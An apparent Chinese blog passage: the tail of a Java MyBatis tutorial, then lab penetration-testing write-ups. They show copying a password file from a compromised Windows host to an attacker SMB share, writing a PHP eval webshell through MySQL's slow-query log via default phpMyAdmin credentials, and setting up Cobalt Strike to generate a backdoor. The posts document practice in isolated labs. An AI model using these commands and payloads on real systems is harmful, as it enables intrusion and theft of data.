<h3 id="entity实体类代码"><a href="#entity实体类代码" class="headerlink" title="entity实体类代码"></a>entity实体类代码</h3><h4 id="TBook类"><a href="#TBook类" class="headerlink" title="TBook类"></a>TBook类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TBook</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String bookname;</span><br><span class="line">    <span class="keyword">private</span> Double price;</span><br><span class="line">    <span class="keyword">private</span> String publisher;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> status;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBookname</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bookname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBookname</span><span class="params">(String bookname)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookname = bookname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Double <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(Double price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPublisher</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> publisher;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPublisher</span><span class="params">(String publisher)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.publisher = publisher;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getStatus</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStatus</span><span class="params">(<span class="type">int</span> status)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.status = status;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="JSONObject类"><a href="#JSONObject类" class="headerlink" title="JSONObject类"></a>JSONObject类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONObject</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object o;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(String code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMsg</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getO</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setO</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.o = o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="dao接口"><a href="#dao接口" class="headerlink" title="dao接口"></a>dao接口</h3> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.testbook.entity.TBook;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BookDao</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">save</span><span class="params">(TBook book)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TBook <span class="title function_">queryBookByBookname</span><span class="params">(String bookname)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从数据库中查询所有属于指定出版社的书籍，并将这些书籍以 TBook 对象的列表形式返回</span></span><br><span class="line">    List&lt;TBook&gt; <span class="title function_">queryPublisherAllBook</span><span class="params">(String publisher)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sevice服务接口"><a href="#sevice服务接口" class="headerlink" title="sevice服务接口"></a>sevice服务接口</h3><p>BookServiceImpl类（覆写对应接口方法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.testbook.dao.BookDao;</span><br><span class="line"><span class="keyword">import</span> com.example.testbook.entity.TBook;</span><br><span class="line"><span class="keyword">import</span> com.example.testbook.service.BookService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> BookDao bookDao;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">save</span><span class="params">(TBook book)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bookDao.save(book);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> TBook <span class="title function_">queryBookByBookname</span><span class="params">(String bookname)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bookDao.queryBookByBookname(bookname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;TBook&gt; <span class="title function_">queryPublisherAllBook</span><span class="params">(String publisher)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bookDao.queryPublisherAllBook(publisher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BookService接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.testbook.entity.TBook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">save</span><span class="params">(TBook book)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TBook <span class="title function_">queryBookByBookname</span><span class="params">(String bookname)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;TBook&gt; <span class="title function_">queryPublisherAllBook</span><span class="params">(String publisher)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h4 id="SQL映射配置"><a href="#SQL映射配置" class="headerlink" title="SQL映射配置"></a>SQL映射配置</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.testbook.dao.BookDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;save&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.example.testbook.entity.TBook&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span> &gt;</span></span><br><span class="line">        insert into t_book (</span><br><span class="line">            `bookname`,</span><br><span class="line">            `price`,</span><br><span class="line">            `publisher`,</span><br><span class="line">            `status`</span><br><span class="line">        ) VALUES (</span><br><span class="line">                     #&#123;bookname&#125;,</span><br><span class="line">                     #&#123;price&#125;,</span><br><span class="line">                     #&#123;publisher&#125;,</span><br><span class="line">                     #&#123;status&#125;</span><br><span class="line">                 );</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryBookByBookname&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;string&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.testbook.entity.TBook&quot;</span>&gt;</span></span><br><span class="line">        select * from t_book where bookname = #&#123;bookname&#125; and status = 1</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryPublisherAllBook&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.testbook.entity.TBook&quot;</span>&gt;</span></span><br><span class="line">        select * from t_book where publisher = #&#123;publisher&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.application.name=testBook</span><br><span class="line">server.port=8087</span><br><span class="line"></span><br><span class="line">### mybatis</span><br><span class="line">mybatis.mapper-locations=classpath:/mybatis-mapper/*Mapper.xml</span><br><span class="line">mybatis.configuration.map-underscore-to-camel-case=true</span><br><span class="line"></span><br><span class="line">### xxl-job, datasource</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/testmysql?useUnicode=true&amp;useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=root</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">### datasource-pool</span><br><span class="line">spring.datasource.type=com.zaxxer.hikari.HikariDataSource</span><br><span class="line">spring.datasource.hikari.minimum-idle=10</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=30</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=30000</span><br><span class="line">spring.datasource.hikari.pool-name=HikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=900000</span><br><span class="line">spring.datasource.hikari.connection-timeout=10000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br><span class="line">spring.datasource.hikari.validation-timeout=1000</span><br></pre></td></tr></table></figure>

<h4 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h4><p>具体要求如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t_book表</span><br><span class="line">字段:</span><br><span class="line">	id</span><br><span class="line">	bookname 书名</span><br><span class="line">	price 价格</span><br><span class="line">	publisher 出版社</span><br><span class="line">	status 状态0为借出，1为存在</span><br></pre></td></tr></table></figure>

<p>打开Navicat，创建testmysql数据库后新建查询，写入以下代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_book` (</span><br><span class="line">`id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">`bookname` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;书名&#x27;</span>,</span><br><span class="line">`price` <span class="type">int</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;价格&#x27;</span>,</span><br><span class="line">`publisher` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出版社&#x27;</span>,</span><br><span class="line">`status` <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;状态0为借出，1为存在&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%AD%A6%E4%B9%A0java%E4%B8%ADORM%E6%A1%86%E6%9E%B6-mybatis/image-20241026010821897.png"></p>
<h2 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h2><h5 id="新建书本-createbook"><a href="#新建书本-createbook" class="headerlink" title="新建书本 &#x2F;createbook"></a>新建书本 &#x2F;createbook</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;bookname&quot;</span><span class="punctuation">:</span><span class="string">&quot;sanguo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span><span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;publisher&quot;</span><span class="punctuation">:</span><span class="string">&quot;gongye&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%AD%A6%E4%B9%A0java%E4%B8%ADORM%E6%A1%86%E6%9E%B6-mybatis/image-20241026003019131.png"></p>
<h5 id="查询书籍是否存在-querybook"><a href="#查询书籍是否存在-querybook" class="headerlink" title="查询书籍是否存在 &#x2F;querybook"></a>查询书籍是否存在 &#x2F;querybook</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;bookname&quot;</span><span class="punctuation">:</span><span class="string">&quot;sanguo&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%AD%A6%E4%B9%A0java%E4%B8%ADORM%E6%A1%86%E6%9E%B6-mybatis/image-20241026004243010.png"></p>
<h5 id="查询出版社全部书籍-queryPublisherAllBook"><a href="#查询出版社全部书籍-queryPublisherAllBook" class="headerlink" title="查询出版社全部书籍 &#x2F;queryPublisherAllBook"></a>查询出版社全部书籍 &#x2F;queryPublisherAllBook</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;publisher&quot;</span><span class="punctuation">:</span><span class="string">&quot;gongye&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%AD%A6%E4%B9%A0java%E4%B8%ADORM%E6%A1%86%E6%9E%B6-mybatis/image-20241026004422577.png"></p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>建立共享获取敏感文件</title>
    <url>/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6.html</url>
    <content><![CDATA[<p>在本地测试并学习如何渗透过程中获取敏感文件</p>
<span id="more"></span>

<h1 id="建立共享获取敏感文件"><a href="#建立共享获取敏感文件" class="headerlink" title="建立共享获取敏感文件"></a>建立共享获取敏感文件</h1><p><strong>本地测试环境</strong></p>
<ul>
<li>攻击机：kali（192.168.132.133）</li>
<li>目标机：win7（192.168.132.136）</li>
</ul>
<p><strong>实现过程</strong></p>
<p>在拿到win7的控制权后，成功找到敏感文件</p>
<p><img src="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/image-20240901154755459.png"></p>
<p>在kali攻击机搭建smb服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo impacket-smbserver getinfo . -smb2support -username rev1ve -password rev1ve@.</span><br></pre></td></tr></table></figure>

<p>注：getinfo为共享文件名</p>
<p><img src="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/image-20240901155254481.png"></p>
<p>然后在win7的shell建立共享连接，并拷贝敏感文件到kali里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.132.133\getinfo /user:rev1ve rev1ve@.</span><br><span class="line">copy-item ./password.txt \\192.168.132.133\getinfo\password.txt</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/image-20240901155711217.png"></p>
<p>连接情况如下</p>
<p><img src="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/image-20240901155802361.png"></p>
<p>成功读取敏感信息</p>
<p><img src="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/image-20240901155627393.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场1</title>
    <url>/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html</url>
    <content><![CDATA[<p>phpMyadmin后台getshell、令牌窃取提权、Win32k 特权提升漏洞</p>
<span id="more"></span>

<h1 id="红日靶场1"><a href="#红日靶场1" class="headerlink" title="红日靶场1"></a>红日靶场1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>整体配置图如下</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1.png"></p>
<p>现在为三台靶机配置网卡</p>
<p>打开vm找到左上角<code>编辑—&gt;虚拟网络编辑器</code>添加一段虚拟网络VMnet2，设置为仅主机</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235640022.png"></p>
<h3 id="配置攻击机kali"><a href="#配置攻击机kali" class="headerlink" title="配置攻击机kali"></a>配置攻击机kali</h3><p>这里使用我自己虚拟机的kali作为攻击机，添加网络适配器，设置为双网卡NAT，vm1</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235743765.png"></p>
<p>不过这里配置好后执行<code>ifconfig</code>后，并没有分配vm1网段的ip</p>
<p>手动添加一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ip addr add 192.168.80.10/24 dev eth1            #分配ip</span><br><span class="line">sudo ip route add default via 192.168.80.1            #设置默认网关</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717000529082.png"></p>
<h3 id="配置win7-x64"><a href="#配置win7-x64" class="headerlink" title="配置win7 x64"></a>配置win7 x64</h3><p>设置<code>win7 x64</code>为双网卡vm1，vm2</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710105732552.png"></p>
<h3 id="配置win2008"><a href="#配置win2008" class="headerlink" title="配置win2008"></a>配置win2008</h3><p>设置<code>win2008</code>为单网卡vm2</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235824459.png"></p>
<h3 id="配置win2k3"><a href="#配置win2k3" class="headerlink" title="配置win2k3"></a>配置win2k3</h3><p>设置<code>win2k3</code>为单网卡vm2</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235848452.png"></p>
<h3 id="启动phpstudy服务"><a href="#启动phpstudy服务" class="headerlink" title="启动phpstudy服务"></a>启动phpstudy服务</h3><p>打开<code>win7 x64</code>，用<code>hongrisec@2019</code>密码进行登录（三台靶机密码相同）</p>
<p>找到<code>C:\phpStudy</code>的phpstudy后启动服务，结果发现phpstudy停止工作</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111021184.png"></p>
<p>去网上搜了下找到解决办法，升级下虚拟机就行了</p>
<p>我这里选择最新的16.2版本</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111248198.png"></p>
<p>然后点击更改此虚拟机</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111529927.png"></p>
<p>升级好后重新打开<code>win7 x64</code>，成功启动服务</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111905892.png"></p>
<p>访问<code>localhost/yxcms</code>，出现下图说明搭建成功</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710112310348.png"></p>
<p><strong>注意：在渗透过程中所有主机都需要打开</strong></p>
<hr>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -v 192.168.80.128</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 </span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>

<p>存在80端口我们直接访问</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710182754781.png"></p>
<p>dirsearch扫一下目录，忽略掉403</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.80.128/ -x 403</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183352428.png"></p>
<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>扫出来发现有<code>/phpMyadmin</code>，访问用<code>root:root</code>成功登录</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183556723.png"></p>
<p>我们先看看是否有限制目录读写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183916873.png"></p>
<p>如果为null的话表示不允许数据的导入和导出，那么无法进行写文件和读文件</p>
<p>这里可以利用慢日志来写shell，我们先查看慢日志是否被启用以及日志文件的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710184634080.png"></p>
<p>我们写shell的话，这里需要开启慢查询并且修改日志文件存放路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>然后执行查询语句，把一句话木马写到shell.php里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);</span><br><span class="line">#sleep时间要超过最大限制（也就是10秒）才生效</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716113154008.png"></p>
<p>写完shell后用蚁剑连接</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716113459685.png"></p>
<p>我们右键在此处打开终端</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716114406682.png"></p>
<p>先看看是否存在杀软程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure>

<p>将执行结果复制到<a href="https://www.ddosi.org/av/1.php">在线网站</a>查询一下</p>
<p>可以看到这台机子没有杀软，那么就简单多了</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716115257709.png"></p>
<h2 id="打法一"><a href="#打法一" class="headerlink" title="打法一"></a>打法一</h2><h3 id="联动蚁剑上线cs"><a href="#联动蚁剑上线cs" class="headerlink" title="联动蚁剑上线cs"></a>联动蚁剑上线cs</h3><p>我们直接联动蚁剑上线cs，在cs文件夹打开终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x teamserver                  #给予服务端程序teamserver 执行权限</span><br><span class="line">./teamserver 192.168.80.10 root      #运行服务端程序，192.168.80.10是本机IP，root是要设置的连接密码</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717105803656.png"></p>
<p>开启服务端后，新建终端输入以下命令运行客户端程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>

<p>新建配置文件，连接CS服务器</p>
<p>(主机和密码就是刚刚设置的，用户名随便填一个)</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717105916666.png"></p>
<p>客户端启动成功后，右上角添加本地监听器</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110034983.png"></p>
<p>右上角<code>攻击 -&gt; 生成后门 -&gt; Windows Executable</code>，生成后门可执行文件</p>
<p>监听器选择刚刚创建的，勾选x64</p>
